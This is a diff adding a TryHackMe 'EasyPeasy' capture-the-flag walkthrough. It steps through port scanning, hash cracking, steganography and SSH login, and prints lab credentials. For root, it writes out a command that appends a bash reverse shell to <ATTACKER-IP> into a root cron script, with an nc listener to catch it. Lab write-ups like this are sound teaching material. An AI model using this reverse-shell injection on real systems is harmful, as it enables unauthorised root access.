@@ -1,0 +1,100 @@
+# TryHackMe — EasyPeasy
+> Focus: Web exploitation · Hash cracking · Steganography · Privilege escalation.
+
+## Ethics & Scope
+- This walkthrough is for **educational purposes** only.  
+- Test only in your own TryHackMe lab instance.  
+- All outputs shown here are **redacted examples** — replace with your own results.  
+- **Never** reuse techniques illegally.
+
+## Tools Used
+- `nmap` — port scanning  
+- `gobuster` — directory brute-forcing  
+- `john` / `hashcat` — hash cracking  
+- `cyberchef` — decoding & cipher solving  
+- `steghide` — steganography extraction  
+- `ssh`, `nc` — access & reverse shell listener  
+
+## Steps
+
+### 1. Reconnaissance (nmap)
+nmap -sCV -p- <TARGET-IP>
+
+**Findings:**
+
+* `80/tcp` → nginx 1.16.1
+* `6498/tcp` → OpenSSH 7.6p1
+* `65524/tcp` → Apache
+
+### 2. Web Enumeration (gobuster)
+gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+Discovered `/hidden`, `robots.txt`.
+
+### 3. Flag 1 — hidden page MD5
+
+Inspect HTML source → find MD5 string → crack with online tools or `john`.
+
+### 4. Flag 2 — high-port service
+
+Visit `http://<TARGET-IP>:65524/robots.txt` → contains hash.
+Crack with multiple online services (e.g., md5hashing).
+
+### 5. Flag 3 — direct in HTML
+
+Page on port 65524 references:
+
+### 6. Hidden Directory
+
+HTML also contains encoded string (`ObsJmP173N2X6dOrAgEAL0Vu`).
+Test Base32/58/62 decoding → reveals:
+
+### 7. Password Hash (boring user)
+
+Inside hidden directory, find new hash.
+Save to file & crack with provided wordlist:
+
+john --wordlist=easypeasy.txt --format=Raw-MD5 hash.txt
+
+### 8. SSH Credentials
+
+Steganography in `index.jpeg` (download from hidden path):
+steghide extract -sf index.jpeg -p "mypasswordforthatjob"
+
+Output file reveals:
+username: boring
+password: iconvertedmypasswordtobinary
+
+### 9. User Flag
+
+SSH login:
+ssh boring@<TARGET-IP> -p 6498
+
+Inside, find scrambled flag:
+
+Decode with ROT13 →
+
+### 10. Root Flag (Privilege Escalation)
+
+Check crontab:
+cat /etc/crontab
+
+Vulnerable cron job:
+* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+Inject reverse shell:
+echo "bash -c 'exec bash -i &>/dev/tcp/<ATTACKER-IP>/4444 <&1'" >> /var/www/.mysecretcronjob.sh
+
+Start listener:
+nc -lvnp 4444
+
+Catch root shell → read:
+/root/.root.txt
+
+## Lessons Learned
+
+* Always scan **all ports** — hidden services matter.
+* Don’t trust one hash-cracking service — try several.
+* Look for **encoded hints** in HTML.
+* Steganography and ROT ciphers are common CTF tricks.
+* Misconfigured **cron jobs** often give root in labs.
